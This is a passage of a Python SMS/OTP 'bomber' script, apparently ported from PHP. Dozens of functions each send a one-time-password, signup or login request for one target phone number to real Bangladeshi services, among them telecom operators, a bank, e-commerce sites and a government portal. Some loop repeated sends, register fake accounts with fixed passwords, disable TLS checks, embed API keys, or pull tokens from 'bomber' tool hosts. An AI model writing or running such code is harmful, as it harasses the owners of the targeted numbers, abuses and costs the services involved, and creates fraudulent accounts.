    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error #:", e)


def call_api56(phone: str) -> None:
    """
    Equivalent to api56.php:
    Send OTP via api.osudpotro.com.
    """
    url = "https://api.osudpotro.com/api/v1/users/send_otp"
    payload = {
        "mobile": f"+88-{phone}",
        "deviceToken": "app",
        "language": "bn",
        "os": "android",
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) "
            "Gecko/20100101 Firefox/109.0"
        ),
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api57(phone: str) -> None:
    """
    Equivalent to api57.php:
    GraphQL sendOTP via kormi24.com.
    """
    url = "https://api.kormi24.com/graphql"
    additional = {
        "user_agent": "web",
        "mobile": phone,
    }
    payload = {
        "operationName": "sendOTP",
        "variables": {
            "type": 1,
            "mobile": phone,
            "additional": json.dumps(additional),
            "hash": (
                "c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64"
                "571e63f5b2680180"
            ),
        },
        "query": (
            "mutation sendOTP($mobile: String!, $type: Int!, $additional: String, "
            "$hash: String!) { sendOTP(mobile: $mobile, type: $type, "
            "additional: $additional, hash: $hash) { status message __typename }}"
        ),
    }
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "authorization": "tok",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://www.kormi24.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://www.kormi24.com/",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api58(phone: str) -> None:
    """
    Equivalent to api58.php:
    Send OTP 5 times via weblogin.grameenphone.com.
    """
    url = "https://weblogin.grameenphone.com/backend/api/v1/otp"
    data = {"msisdn": phone}
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://weblogin.grameenphone.com",
        "Referer": (
            "https://weblogin.grameenphone.com/"
            "?referrer=https://www.grameenphone.com/flexi-plan/"
        ),
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ),
    }

    for i in range(5):
        try:
            resp = requests.post(
                url,
                json=data,
                headers=headers,
            )
            resp.raise_for_status()
            print(f"Response {i+1}:", resp.text)
        except requests.RequestException as e:
            print(f"Error {i+1}:", e)


def call_api59(phone: str) -> None:
    """
    Equivalent to api59.php:
    Auth via shwapno.com with +88 phone.
    """
    full_phone = "+88" + phone
    url = "https://www.shwapno.com/api/auth"
    payload = {"phoneNumber": full_phone}
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://www.shwapno.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://www.shwapno.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
        )
        resp.raise_for_status()
        print("Shwapno Response:", resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api60(phone: str) -> None:
    """
    Equivalent to api60.php:
    Send OTP via developer.quizgiri.xyz with country code.
    """
    url = "https://developer.quizgiri.xyz:443/api/v2.0/send-otp"
    payload = {
        "phone": phone,
        "country_code": "+880",
    }
    headers = {
        "Content-Type": "application/json",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print("Response:", resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api61(phone: str) -> None:
    """
    Equivalent to api61.php:
    Send OTP via myblapi.banglalink.net.
    """
    url = "https://myblapi.banglalink.net/api/v1/send-otp"
    payload = {"phone": phone}
    headers = {
        "Content-Type": "application/json",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api62(phone: str) -> None:
    """
    Equivalent to api62.php:
    GraphQL createCustomerOtp via waltonplaza.com.bd.
    """
    url = "https://api.waltonplaza.com.bd/graphql"
    payload = {
        "operationName": "createCustomerOtp",
        "variables": {
            "auth": {
                "countryCode": "880",
                "deviceUuid": "998283c0-622a-11ee-84c0-190466a47baa",
                "phone": phone,
            },
            "device": None,
        },
        "query": (
            "mutation createCustomerOtp($auth: CustomerAuthInput!, $device: DeviceInput) "
            "{ createCustomerOtp(auth: $auth, device: $device) { message result { id "
            "__typename } statusCode __typename } }"
        ),
    }
    headers = {
        "Content-Type": "application/json",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
        )
        resp.raise_for_status()
        print("Response:", resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api63(phone: str) -> None:
    """
    Equivalent to api63.php:
    Generate OTP via apialpha.pbs.com.bd.
    """
    url = "https://apialpha.pbs.com.bd/api/OTP/generateOTP"
    payload = {
        "userPhone": phone,
        "otp": "",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://pbs.com.bd",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://pbs.com.bd/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
        )
        resp.raise_for_status()
        print("PBS OTP Response:", resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api64(phone: str) -> None:
    """
    Equivalent to api64.php:
    Multiple GraphQL calls to aarong.com (checkCustomerExist, generateCustomerToken, resendOtp).
    """
    url = "https://mcprod.aarong.com/graphql"
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://www.aarong.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://www.aarong.com/",
        "store": "default",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    def call_api(payload: dict) -> None:
        try:
            resp = requests.post(url, json=payload, headers=headers)
            resp.raise_for_status()
            print(resp.text)
        except requests.RequestException as e:
            print("Error:", e)

    # 1) checkCustomerExist
    query1 = {
        "query": (
            "query{checkCustomerExist(mobile_number:\""
            + phone
            + '\" email:""){status message}}'
        )
    }
    call_api(query1)
    print()

    # 2) generateCustomerToken
    query2 = {
        "query": (
            "mutation generateCustomerToken($email: String!, $password: String!, "
            "$type: String!, $mobile_number: String!) { generateCustomerToken("
            "email: $email password: $password type: $type mobile_number: "
            "$mobile_number ) { token message } }"
        ),
        "variables": {
            "email": "",
            "password": "",
            "type": "mobile_number",
            "mobile_number": phone,
        },
    }
    call_api(query2)
    print()

    # 3) resendOtp
    query3 = {
        "query": (
            "mutation resendOtp($email: String, $mobile_number: String!, $type: String!) "
            "{ resendOtp(input: { email: $email mobile_number: $mobile_number type: $type }) }"
        ),
        "variables": {
            "email": "",
            "mobile_number": phone,
            "type": "mobile_number",
        },
    }
    call_api(query3)


def call_api65(phone: str) -> None:
    """
    Equivalent to api65.php:
    Send SMS via api.arogga.com mobile endpoint.
    """
    url = (
        "https://api.arogga.com/auth/v1/sms/send"
        "?f=app&v=6.2.7&os=android&osv=33"
    )
    payload = {
        "mobile": phone,
        "fcmToken": (
            "cQYjPWHHTDu1IVXnW90Xqs:APA91bHB71xe_ai41Vm-aq9DFkukrF9mAH13DPAIInmus7pykdI49PZTgqy4Qy5"
            "x8Q5TG6zd1HIOIGDCV8UH5K5l3rc1Z36R-km9T-NhotH3TBjhJOZ43Kw2xqr8lr3vuWgTMUHybMnR"
        ),
        "referral": "",
    }
    headers = {
        "User-Agent": "okhttp/4.9.2",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        resp = requests.post(
            url,
            data=payload,
            headers=headers,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error #:", e)


def call_api66(phone: str) -> None:
    """
    Equivalent to api66.php:
    CreateAccessToken via sundarbancourierltd GraphQL.
    """
    url = "https://api-gateway.sundarbancourierltd.com/graphql"
    payload = {
        "operationName": "CreateAccessToken",
        "variables": {
            "accessTokenFilter": {
                "userName": phone,
            }
        },
        "query": (
            "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {"
            "  createAccessToken(accessTokenFilter: $accessTokenFilter) {"
            "    message statusCode result { phone otpCounter __typename } __typename }}"
        ),
    }
    headers = {
        "Content-Type": "application/json",
        "Host": "api-gateway.sundarbancourierltd.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "https://customer.sundarbancourierltd.com/",
        "Origin": "https://customer.sundarbancourierltd.com",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api67(phone: str) -> None:
    """
    Equivalent to api67.php:
    Send OTP via developer.quiztime.gamehubbd.com with +88 phone.
    """
    url = "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp"
    payload = {
        "country_code": "+88",
        "phone": phone,
    }
    headers = {
        "Content-Type": "application/json",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Curl error:", e)


def call_api68(phone: str) -> None:
    """
    Equivalent to api68.php:
    Send OTP via dressup.com.bd (Flutter digits).
    """
    mobile_trim = phone.lstrip("0")
    url = (
        "https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp"
    )
    payload = {
        "country_code": "+880",
        "mobile": mobile_trim,
        "type": "login",
        "whatsapp": False,
    }
    headers = {
        "User-Agent": "Dart/3.5 (dart:io)",
        "Accept-Encoding": "gzip",
        "content-type": "application/json; charset=utf-8",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error #:", e)


def call_api69(phone: str) -> None:
    """
    Equivalent to api69.php:
    Signup OTP via ghoorilearning.com.
    """
    url = (
        "https://api.ghoorilearning.com/api/auth/signup/otp"
        "?_app_platform=web"
    )
    payload = {"mobile_no": phone}
    headers = {
        "Host": "api.ghoorilearning.com",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "user-agent": (
            "Mozilla/5.0 (Linux; Android 13; RMX3286 Build/SP1A.210812.016) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.164 "
            "Mobile Safari/537.36"
        ),
        "origin": "https://ghoorilearning.com",
        "x-requested-with": "mark.via.gp",
        "referer": "https://ghoorilearning.com/",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api70(phone: str) -> None:
    """
    Equivalent to api70.php:
    Login via garibook.com API (OTP).
    """
    url = "https://api.garibookadmin.com/api/v3/user/login"
    payload = {
        "mobile": phone,
        "recaptcha_token": "garibookcaptcha",
        "channel": "web",
    }
    headers = {
        "Accept-Language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Origin": "https://garibook.com",
        "Pragma": "no-cache",
        "Referer": "https://garibook.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
        "accept": "application/json",
        "content-type": "application/json",
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api71(phone: str) -> None:
    """
    Equivalent to api71.php:
    Signup then phone-login OTP via fabrilife.com.
    """
    # random name
    first_names = ["John", "Riyaz", "Sarah", "Michael", "Emma"]
    last_names = ["Smith", "Ahmed", "Khan", "Doe", "Patel"]
    name = f"{random.choice(first_names)} {random.choice(last_names)}"

    # Signup
    url_signup = (
        "https://fabrilife.com/api/wp-json/wc/v2/user/register"
    )
    payload_signup = {
        "name": name,
        "email": f"{phone}@gmail.com",
        "phone": phone,
        "password": "Riyaz@123",
    }
    headers_signup = {
        "User-Agent": "okhttp/3.12.12",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json",
    }
    try:
        resp_signup = requests.post(
            url_signup,
            json=payload_signup,
            headers=headers_signup,
        )
        print("Signup Response:", resp_signup.text)
    except requests.RequestException as e:
        print("Signup Error:", e)

    # OTP request
    url_otp = (
        "https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/"
        f"{phone}"
    )
    headers_otp = {
        "User-Agent": "okhttp/3.12.12",
        "Accept-Encoding": "gzip",
        "otpkey": "uzmgAMHfQrukDqV1ecZ2xJGwqjiVPnE0byuqw2MW",
    }
    try:
        resp_otp = requests.post(
            url_otp,
            headers=headers_otp,
        )
        print("OTP Response:", resp_otp.text)
    except requests.RequestException as e:
        print("OTP Error:", e)


def call_api72(phone: str) -> None:
    """
    Equivalent to api72.php:
    Two-step Kotha deviceAuth and sendOTPV2 with random deviceId.
    """
    device_id = f"{random.randint(1, 1_000_000_000)}-{random.randint(1, 1_000_000_000)}"

    # 1) deviceAuthWithRecipientStatus
    url1 = (
        "https://user.kotha.im/mobile/api/deviceAuthWithRecipientStatus"
    )
    payload1 = {
        "deviceId": device_id,
        "recipient": "+88" + phone,
    }
    headers1 = {
        "User-Agent": "okhttp/4.12.0",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/json; charset=UTF-8",
    }
    try:
        resp1 = requests.post(
            url1,
            json=payload1,
            headers=headers1,
        )
        print("First response:", resp1.text)
        data = resp1.json()
        token = data.get("token")
    except Exception as e:
        print("First request error:", e)
        token = None

    if not token:
        print("Skipping second request as token is unavailable.")
        return

    # 2) sendOTPV2
    url2 = "https://user.kotha.im/mobile/api/sendOTPV2"
    payload2 = {
        "deviceId": device_id,
        "recipient": "+88" + phone,
        "retryAttempt": 0,
    }
    headers2 = {
        "User-Agent": (
            "kotha-android-version_0.1.20241002-code_285-os-sdk-level_33-"
            "manufacturer_OnePlus-model_GM1917-os-sdk-level_33"
        ),
        "Accept-Encoding": "gzip",
        "Authorization": token,
        "Content-Type": "application/json; charset=UTF-8",
    }
    try:
        resp2 = requests.post(
            url2,
            json=payload2,
            headers=headers2,
        )
        print("Second response:", resp2.text)
    except requests.RequestException as e:
        print("Second request error:", e)


def call_api73(phone: str) -> None:
    """
    Equivalent to api73.php:
    Send OTP via bdia.btcl.com.bd (registrationMobVerification-2.jsp).
    """
    mobile = phone.lstrip("0")
    url = (
        "https://bdia.btcl.com.bd/client/client/"
        "registrationMobVerification-2.jsp?moduleID=1"
    )
    data = {
        "actionType": "otpSend",
        "mobileNo": mobile,
    }
    headers = {
        "accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,"
            "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        ),
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://bdia.btcl.com.bd",
        "pragma": "no-cache",
        "priority": "u=0, i",
        "referer": (
            "https://bdia.btcl.com.bd/client/client/"
            "registrationMobVerification-1.jsp?moduleID=1"
        ),
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.post(
            url,
            data=data,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL ERROR:", e)


def call_api74(phone: str) -> None:
    """
    Equivalent to api74.php:
    Send OTP via phonebill.btcl.com.bd (OTPType 1).
    """
    url = (
        "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json"
    )
    payload = {
        "phoneNbr": phone,
        "email": "",
        "OTPType": 1,
        "userName": "",
    }
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://phonebill.btcl.com.bd",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://phonebill.btcl.com.bd/register",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL ERROR:", e)


def call_api75(phone: str) -> None:
    """
    Equivalent to api75.php:
    Send OTP via phonebill.btcl.com.bd (OTPType 15, login).
    """
    url = (
        "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json"
    )
    payload = {
        "OTPType": 15,
        "userName": phone,
        "isNewPhoneOrEmail": False,
    }
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9,ru;q=0.8,zh-TW;q=0.7,zh;q=0.6",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://phonebill.btcl.com.bd",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://phonebill.btcl.com.bd/login",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        ),
    }

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            verify=False,
        )
        resp.raise_for_status()
        print(resp.text)
    except requests.RequestException as e:
        print("cURL ERROR:", e)


def call_api100(phone: str) -> None:
    """
    Equivalent to api100.php:
    Two requests: first to n1nx-bomber, then to turtle888 with captcha.
    """
    phn = phone.lstrip("0")
    url1 = "https://api.n1nx-bomber.my.id/call/crazy-capcha.php"
    try:
        resp1 = requests.get(url1, verify=False)
        print("Response from crazy-capcha.php:", resp1.text)
    except requests.RequestException as e:
        print("Error in first request:", e)

    url2 = "https://feapi.turtle888.xyz/api/member/reqFgtPsw"
    data2 = {
        "mobile": phn,
        "prefix": "+880",
        "captcha_id": "9a2badb7-5dd6-4d25-bc40-af52c97d6599",
        "captcha_code": "0000",
    }
    headers2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    try:
        resp2 = requests.post(url2, data=data2, headers=headers2, verify=False)
        print("Response from N1NX Tools:", resp2.text)
    except requests.RequestException as e:
        print("Error in second request:", e)


def call_api101(phone: str) -> None:
    """
    Equivalent to api101.php:
    POST to api.blackfire-tools.xyz with member registration.
    """
    phn = phone.lstrip("0")
    url = "https://api.blackfire-tools.xyz/api/member"
    data = {
        "membercode": "a" + phn,
        "password": "Boss2024",
        "currency": "BDT",
        "email": "",
        "registration_site": "desktop",
        "mobile": phn,
        "line": "",
        "referral_code": "",
        "is_early_bird": "0",
        "domain": "https://crazytime.app",
        "language": "bd",
        "reg_type": 2,
        "agent_team": "",
        "utm_source": None,
        "utm_medium": None,
        "utm_campaign": None,
        "s2": None,
        "fp": f"b9da7f24a57{phn}ada52d12hdfacc16b23652",
        "c_id": None,
        "pid": None,
        "stag": None,
        "tracking_url": None,
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 6.0; Win64; x64; en-US) AppleWebKit/602.15 "
            "(KHTML, like Gecko) Chrome/49.0.3145.397 Safari/603"
        ),
    }
    try:
        resp = requests.post(url, json=data, headers=headers)
        print("API Response:", resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api102(phone: str) -> None:
    """
    Equivalent to api102.php:
    POST to api.n1nx-bomber.my.id with member registration.
    """
    phn = phone.lstrip("0")
    url = "https://api.n1nx-bomber.my.id/api/member"
    data = {
        "membercode": "a" + phn,
        "password": "Boss2024",
        "currency": "BDT",
        "email": "",
        "registration_site": "desktop",
        "mobile": phn,
        "line": "",
        "referral_code": "",
        "is_early_bird": "0",
        "domain": "https://crazytime.app",
        "language": "bd",
        "reg_type": 2,
        "agent_team": "",
        "utm_source": None,
        "utm_medium": None,
        "utm_campaign": None,
        "s2": None,
        "fp": f"b9da7f24a57{phn}ada52d12hdfacc16b23652",
        "c_id": None,
        "pid": None,
        "stag": None,
        "tracking_url": None,
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 6.0; Win64; x64; en-US) AppleWebKit/602.15 "
            "(KHTML, like Gecko) Chrome/49.0.3145.397 Safari/603"
        ),
    }
    try:
        resp = requests.post(url, json=data, headers=headers)
        print("API Response:", resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api103(phone: str) -> None:
    """
    Equivalent to api103.php:
    POST (empty body) to daktarbhai OTP endpoint with query params.
    """
    url = (
        "https://api.daktarbhai.com/api/v2/otp/generate"
        f"?&api_key=BUFWICFGGNILMSLIYUVE&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVH"
        f"&mobile=%2B88{phone}&platform=app&activity=login"
    )
    headers = {
        "user-agent": "Morizila/5.0",
        "Content-Type": "application/json",
        "Content-Length": "0",
    }
    try:
        resp = requests.post(url, headers=headers, verify=False)
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api104(phone: str) -> None:
    """
    Equivalent to api104.php:
    POST to Dhaka Bank VerifyMobileNumber.
    """
    url = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
    payload = {
        "AccessToken": "",
        "TrackingNo": "",
        "mobileNo": phone,
        "otpSms": "",
        "product_id": "250",
        "requestChannel": "MOB",
        "trackingStatus": 5,
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    }
    try:
        resp = requests.post(url, json=payload, headers=headers, verify=False)
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api105(phone: str) -> None:
    """
    Equivalent to api105.php:
    POST to deeptoplay login with phone number.
    """
    url = "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web"
    payload = {"number": phone}
    headers = {"Content-Type": "application/json"}
    try:
        resp = requests.post(url, json=payload, headers=headers, verify=False)
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api106(phone: str) -> None:
    """
    Equivalent to api106.php:
    POST form data to digitalpaurashava OTP endpoint.
    """
    url = "http://digitalpaurashava.gov.bd/BizRunner/BD/API/SendMobileVerificationCodePage.bzr"
    data = {"mobileNo": phone}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        resp = requests.post(url, data=data, headers=headers, verify=False)
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api107(phone: str) -> None:
    """
    Equivalent to api107.php:
    POST to Doctime cloud function with +88 prefix.
    """
    url = "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber"
    data = {
        "data": {
            "flag": "https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png",
            "code": "88",
            "contact_no": phone,
            "country_calling_code": "88",
            "headers": {"PlatForm": "Web"},
        }
    }
    headers = {
        "Content-Type": "application/json",
        "Referer": "https://doctime.com.bd/",
        "Origin": "https://doctime.com.bd",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    }
    try:
        resp = requests.post(url, json=data, headers=headers)
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api108(phone: str) -> None:
    """
    Equivalent to api108.php:
    POST to easy.com.bd registration.
    """
    url = "https://core.easy.com.bd/api/v1/registration"
    payload = {
        "name": "Shahidul Islam",
        "email": "uyrlhkgxqw@emergentvillage.org",
        "mobile": phone,
        "password": "boss#2022",
        "password_confirmation": "boss#2022",
        "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d",
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Referer": "https://easy.com.bd/",
        "Content-Type": "application/json",
    }
    try:
        resp = requests.post(url, json=payload, headers=headers, verify=False)
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api109(phone: str) -> None:
    """
    Equivalent to api109.php:
    GET to ecourier OTP endpoint.
    """
    url = f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}"
    try:
        resp = requests.get(url, verify=False)
        print(resp.text)
    except requests.RequestException as e:
        print("cURL Error:", e)


def call_api110(phone: str) -> None:
    """
    Equivalent to api110.php:
    Fetch token from pikatoolsbd, then POST to Robi AOC.
    """
    phn = phone.lstrip("0")
    url1 = "https://pikatoolsbd.serv00.net/engage-token.php"
    try:
        resp1 = requests.get(url1)
        resp1.raise_for_status()
        data1 = resp1.json()
        token = data1.get("aocToken")
    except Exception as e:
        print("Error fetching token:", e)
        return

    url2 = f"http://robi.mife-aoc.com/api/robi/aoc/ask/{token}"
    payload2 = {"msisdn": phn}
    headers2 = {"Content-Type": "application/json"}
    try:
        resp2 = requests.post(url2, json=payload2, headers=headers2)
        print(resp2.text)
    except requests.RequestException as e:
        print("Error in second request:", e)


def call_api111(phone: str) -> None:
    """
    Equivalent to api111.php:
    GET to engagewinner with dynamic phone number (replaces hardcoded number).
    """
    # Replace the hardcoded phone number in the URL with the provided one
    base_url = "https://www.engagewinner.com/api/users/{}/registration_redirect/?amount=20&phone_number={}&subscriptionDuration=8&subscriptionName=Engage%20Weekly&subscriptionID=Engage%20Weekly&description=Engage%20Weekly&isSubscription=true"
    url = base_url.format(phone, phone)
    try:
        resp = requests.get(url, verify=False)
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api112(phone: str) -> None:
    """
    Equivalent to api112.php:
    POST to eonbazar register with dynamic email.
    """
    url = "https://app.eonbazar.com/api/auth/register"
    payload = {
        "mobile": phone,
        "name": "Karim Mia",
        "password": "karim2023",
        "email": f"dghdj{phone}dsgj@gmail.com",
    }
    headers = {"Content-Type": "application/json"}
    try:
        resp = requests.post(url, json=payload, headers=headers)
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api113(phone: str) -> None:
    """
    Equivalent to api113.php:
    GET to adpoke OTP endpoint.
    """
    url = f"http://68.183.88.91/adpoke/cnt/dot/nserve/bd/send/otp?msisdnprefix=880&msisdn={phone}&token=1693254641407n62562185n33&l="
    headers = {"Referer": "http://68.183.88.91/"}
    try:
        resp = requests.get(url, headers=headers, verify=False)
        # The original PHP outputs "otp send succesfully" regardless of response.
        print("otp send succesfully")
    except requests.RequestException as e:
        print("Error:", e)


def call_api114(phone: str) -> None:
    """
    Equivalent to api114.php:
    POST to banglalink eshop OTP endpoint.
    """
    url = "https://eshop-api.banglalink.net/api/v1/customer/send-otp"
    payload = {"type": "phone", "phone": phone}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "Content-Type": "application/json",
    }
    try:
        resp = requests.post(url, json=payload, headers=headers, verify=False)
        print(resp.text)
    except requests.RequestException as e:
        print("Error:", e)


def call_api115(phone: str) -> None:
    """
